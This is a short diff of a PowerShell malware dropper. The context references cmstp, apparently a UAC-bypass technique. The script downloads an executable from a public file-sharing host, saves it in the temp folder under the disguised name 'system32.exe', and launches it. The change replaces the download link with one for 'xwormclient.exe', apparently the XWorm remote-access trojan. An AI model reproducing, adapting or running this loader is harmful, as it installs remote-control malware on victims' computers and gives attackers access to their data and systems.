@@ -128,7 +128,7 @@ Set-WindowActive cmstp
 
    $url = "$LinkForpy"
      $outpath = "$env:tmp\system32.exe"
-Start-Sleep -Seconds 15; Invoke-WebRequest -Uri https://www87.zippyshare.com/d/pJ6k2Txb/15102/11.exe -OutFile $outpath
+Start-Sleep -Seconds 15; Invoke-WebRequest -Uri https://tmpfiles.org/dl/57665/xwormclient.exe -OutFile $outpath
 
      $args = @("Comma","Separated","Arguments")
      Start-Process -Filepath "$env:tmp\system32.exe" -ArgumentList $args 
